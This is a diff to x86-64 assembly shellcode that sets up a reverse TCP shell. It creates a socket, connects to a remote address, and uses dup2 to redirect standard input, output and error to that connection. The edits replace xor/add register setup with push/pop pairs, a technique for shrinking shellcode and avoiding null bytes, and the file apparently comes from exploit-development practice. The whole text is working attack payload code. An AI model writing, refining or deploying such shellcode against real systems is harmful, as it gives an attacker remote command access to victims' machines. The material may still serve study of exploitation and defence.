@@ -9,12 +9,20 @@ _start:
         ; SOCK_STREAM = 1
         ; syscall number 41
 
-        xor rax, rax
-        add al, 41
-        xor rdi, rdi
-        add di, 2
-        xor rsi, rsi
-        add si,1
+;        xor rax, rax
+ ;       add al, 41
+	push byte 41
+	pop rax
+
+        ;xor rdi, rdi
+       ; add di, 2
+	push byte 2
+	pop rdi
+	
+;        xor rsi, rsi
+ ;       add si,1
+	push byte 1
+	pop rsi
         xor rdx, rdx
         syscall
 
@@ -41,11 +49,16 @@ _start:
         sub rsp, 8
         ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
 
-        xor rax, rax
-        add al, 42
+;        xor rax, rax
+ ;       add al, 42
+	push byte 42
+	pop rax
         mov rsi, rsp
-        xor rdx, rdx
-        add dl, 16
+
+;        xor rdx, rdx
+ ;       add dl, 16
+	push byte 16
+	pop rdx
         syscall
 
 
@@ -53,8 +66,10 @@ _start:
 
         ; dup2 (new, old)
 
-        xor rax, rax
-        add al, 33
+;        xor rax, rax
+ ;       add al, 33
+	push byte 33
+	pop rax
         ;:mov rax, 33
         xor rsi, rsi
 ;        mov rsi, 0
@@ -63,16 +78,22 @@ _start:
         xor rax,rax
         add al, 33
 ;        mov rax, 33
-        xor rsi, rsi
-        add si, 1
+;        xor rsi, rsi
+ ;       add si, 1
+	push byte 1
+	pop rsi
 ;        mov rsi, 1
         syscall
 
-        xor rax, rax
-        mov al, 33
+;        xor rax, rax
+ ;       mov al, 33
+	push byte 33
+	pop rax
 ;        mov rax, 33
-        xor rsi, rsi
-        add si, 2
+;        xor rsi, rsi
+ ;       add si, 2
+	push byte 2
+	pop rsi
         ;mov rsi, 2
         syscall
 
